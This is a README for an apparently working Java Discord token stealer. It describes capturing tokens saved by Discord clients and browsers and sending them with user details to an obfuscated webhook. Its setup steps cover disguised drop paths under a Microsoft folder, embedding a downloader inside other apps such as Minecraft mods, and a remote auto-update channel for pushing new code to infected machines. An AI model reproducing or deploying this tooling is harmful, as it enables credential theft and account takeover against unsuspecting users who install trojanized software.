Simple Discord token logging utility written in Java.
# Features
 - Capture tokens saved by Discord clients and browsers in LevelDB files
 - Retrieve user information using said tokens and seamlessly send it to a designated webhook in an easily customizable embed format with placeholders
 - Deployment through a lightweight downloader that operates independently of external dependencies
 - Enhance and adapt the application's functionality as needed through auto-update capabilities
# Requirements
 - Java 11+
 - Jackson
 - JNA-Platform
# Usage
1. *(Optional)* Modify the download path for the Updater in the **TokenLogger** class
    ```java
    public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    ```
2. Encode your webhook URL in Base64 and paste it into the **TokenLogger** class
    ```java
    public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
    ```
3. *(Optional)* Adjust the download path for the Application in the **Updater** class
    ```java
    private static final String APP_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\Example.jar";
    ```
4. Host a file containing the version and download link to the main Application jar information just like in [/examples/Version Info](../blob/master/examples/Version%20Info) (the link should not be filled out yet)
    ```json
    {
        "version":1,
        "link":""
    }
    ```
5. Update the link in the **UpdateHelper** class to point to the version information file
    ```java
    private static final String INFO_URL = "https://raw.githubusercontent.com/0x5d0/Discord-Token-Logger/master/examples/Version%20Info";
    ```
6. Build the **Updater**
7. Host the Updater jar, following the example in [/examples/Updater.jar](../blob/master/examples/Update.jar)
8. Update the link in the **TokenLogger** class to point to the hosted Updater jar
    ```java
    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Updater.jar";
    ```
9. Update the link in the **Downloader** class as well
    ```java
    private static final String DOWNLOAD_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Updater.jar";
    ```
10. *(Optional)* Modify the download path for the Updater in the **Downloader** class (matching step one)
    ```java
    private static final String SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
    ```
11.  Implement the Downloader source in your preferred Java application (such as a Minecraft mod or any Java app) and build it
12. Build the **Application**
13. Host the main Application jar, similar to [/examples/Application.jar](../blob/master/examples/Application.jar)
14. Return to step four and update the "link" field in the version information file to point to the hosted Application jar
    ```json
    {
    "version":1,
    "link":"https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Application.jar"
    }
    ```
15. Run the Downloader or the Java application with the integrated downloader, and your Discord token and related user information will be automatically sent to your webhook.
## Auto-Update
- ### Application
    To distribute updates to all instances of your application, you must first locate and update the version number in the **UpdateHelper** class to a higher value than the current one.This version number will help identify whether an update is available. You can then make the necessary changes to your main application and build it. Finally, host the new version and update the version information file to reflect these changes. This file serves as a reference for your application to determine whether an update is needed.
    
    *Be cautious when updating the version number. If the version number specified in the UpdateHelper class is smaller than the one in the version information file, the Application and Updater will enter a loop of downloading and deleting each other continuously. Make sure to keep the version numbers consistent to avoid this issue.*
- ### Updater
    To distribute new versions of the updater itself, simply build it with the necessary changes and replace the old file with it. The main application will download it the next time an update is needed.
    
    *If you cannot get the same URL for the updater as before, you will have to push a dummy update of the main application with a higher version number and the link to the new updater jar. In general, if you do not own a server, it would be good practice to host the files on GitHub and update them through that to retain the same URLs.*